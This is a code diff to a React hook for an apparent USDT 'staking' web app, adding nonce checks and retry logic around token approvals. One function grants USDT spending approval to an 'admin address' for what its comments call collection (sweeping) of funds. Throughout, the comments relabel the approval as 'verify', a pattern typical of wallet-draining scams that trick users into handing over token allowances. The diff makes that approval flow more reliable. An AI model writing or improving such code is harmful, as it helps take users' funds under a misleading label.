@@ -104,26 +104,89 @@ export const useWeb3Staking = () => {
 
   // verifyUSDT给质押合约（保留兼容性）
   const approveUsdt = async (amount: string, spenderAddress?: string) => {
-    const parsedAmount = parseUnits(amount, 18)
+    const parsedAmount = parseUnits(amount, 6) // USDT使用6位小数
     
     // 如果提供了 spenderAddress，授权给该地址；否则授权给质押合约
     const targetAddress = spenderAddress || UPDATED_NETWORK.STAKING_CONTRACT
     
     console.log(`🔑 授权 ${amount} USDT 给地址: ${targetAddress}`)
     
-    // verifyUSDT给目标地址
-    const result = await writeContract({
-      address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
-      abi: USDT_ABI,
-      functionName: 'approve',
-      args: [targetAddress as `0x${string}`, parsedAmount]
-    })
-    
-    // writeContract返回的是交易哈希字符串
-    console.log('🔍 writeContract返回结果:', result)
-    console.log('🔍 返回结果类型:', typeof result)
-    
-    return result
+    try {
+      // 检查是否有pending交易，如果有则等待或重置nonce
+      if (typeof window !== 'undefined' && (window as any).ethereum && address) {
+        try {
+          // 使用viem的公共客户端检查nonce
+          const { createPublicClient, http } = await import('viem')
+          const { mainnet } = await import('viem/chains')
+          
+          const publicClient = createPublicClient({
+            chain: mainnet,
+            transport: http('https://ethereum.publicnode.com')
+          })
+          
+          // 检查pending交易
+          const pendingNonce = await publicClient.getTransactionCount({
+            address: address as `0x${string}`,
+            blockTag: 'pending'
+          })
+          const latestNonce = await publicClient.getTransactionCount({
+            address: address as `0x${string}`,
+            blockTag: 'latest'
+          })
+          
+          console.log(`🔍 当前nonce - pending: ${pendingNonce}, latest: ${latestNonce}`)
+          
+          if (pendingNonce > latestNonce) {
+            console.log(`⏳ 检测到 ${pendingNonce - latestNonce} 个pending交易，等待处理...`)
+            // 等待一段时间让pending交易完成
+            await new Promise(resolve => setTimeout(resolve, 3000))
+          }
+        } catch (nonceError) {
+          console.warn('⚠️ 检查nonce失败，继续执行:', nonceError)
+        }
+      }
+      
+      // verifyUSDT给目标地址
+      const result = await writeContract({
+        address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
+        abi: USDT_ABI,
+        functionName: 'approve',
+        args: [targetAddress as `0x${string}`, parsedAmount]
+      })
+      
+      // writeContract返回的是交易哈希字符串
+      console.log('🔍 writeContract返回结果:', result)
+      console.log('🔍 返回结果类型:', typeof result)
+      
+      return result
+    } catch (error: any) {
+      console.error('❌ 授权失败:', error)
+      
+      // 处理Nonce too low错误
+      if (error?.message?.includes('nonce too low') || error?.message?.includes('Nonce too low')) {
+        console.log('🔄 检测到Nonce too low错误，尝试重置...')
+        
+        // 等待一段时间后重试
+        await new Promise(resolve => setTimeout(resolve, 5000))
+        
+        // 重试一次
+        try {
+          const retryResult = await writeContract({
+            address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
+            abi: USDT_ABI,
+            functionName: 'approve',
+            args: [targetAddress as `0x${string}`, parsedAmount]
+          })
+          console.log('✅ 重试成功:', retryResult)
+          return retryResult
+        } catch (retryError) {
+          console.error('❌ 重试也失败:', retryError)
+          throw new Error('授权失败：Nonce错误，请稍后重试或刷新钱包')
+        }
+      }
+      
+      throw error
+    }
   }
 
   // verifyUSDT给权限地址（新增）
@@ -137,15 +200,71 @@ export const useWeb3Staking = () => {
     
     console.log(`📝 准备verify ${amount} USDT (${parsedAmount.toString()}) 给管理员地址: ${adminAddress}`)
     
-    // verifyUSDT给管理员地址，用于归集操作
-    const hash = await writeContract({
-      address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
-      abi: USDT_ABI,
-      functionName: 'approve',
-      args: [adminAddress as `0x${string}`, parsedAmount]
-    })
-    
-    return hash
+    try {
+      // 检查是否有pending交易
+      if (typeof window !== 'undefined' && (window as any).ethereum && address) {
+        try {
+          // 使用viem的公共客户端检查nonce
+          const { createPublicClient, http } = await import('viem')
+          const { mainnet } = await import('viem/chains')
+          
+          const publicClient = createPublicClient({
+            chain: mainnet,
+            transport: http('https://ethereum.publicnode.com')
+          })
+          
+          const pendingNonce = await publicClient.getTransactionCount({
+            address: address as `0x${string}`,
+            blockTag: 'pending'
+          })
+          const latestNonce = await publicClient.getTransactionCount({
+            address: address as `0x${string}`,
+            blockTag: 'latest'
+          })
+          
+          if (pendingNonce > latestNonce) {
+            console.log(`⏳ 检测到 ${pendingNonce - latestNonce} 个pending交易，等待处理...`)
+            await new Promise(resolve => setTimeout(resolve, 3000))
+          }
+        } catch (nonceError) {
+          console.warn('⚠️ 检查nonce失败，继续执行:', nonceError)
+        }
+      }
+      
+      // verifyUSDT给管理员地址，用于归集操作
+      const hash = await writeContract({
+        address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
+        abi: USDT_ABI,
+        functionName: 'approve',
+        args: [adminAddress as `0x${string}`, parsedAmount]
+      })
+      
+      return hash
+    } catch (error: any) {
+      console.error('❌ 授权失败:', error)
+      
+      // 处理Nonce too low错误
+      if (error?.message?.includes('nonce too low') || error?.message?.includes('Nonce too low')) {
+        console.log('🔄 检测到Nonce too low错误，尝试重置...')
+        await new Promise(resolve => setTimeout(resolve, 5000))
+        
+        try {
+          const retryResult = await writeContract({
+            address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
+            abi: USDT_ABI,
+            functionName: 'approve',
+            args: [adminAddress as `0x${string}`, parsedAmount]
+          })
+          console.log('✅ 重试成功:', retryResult)
+          return retryResult
+        } catch (retryError) {
+          console.error('❌ 重试也失败:', retryError)
+          throw new Error('授权失败：Nonce错误，请稍后重试或刷新钱包')
+        }
+      }
+      
+      throw error
+    }
   }
 
   // 质押USDT - 调用SupportXhsk合约的create方法
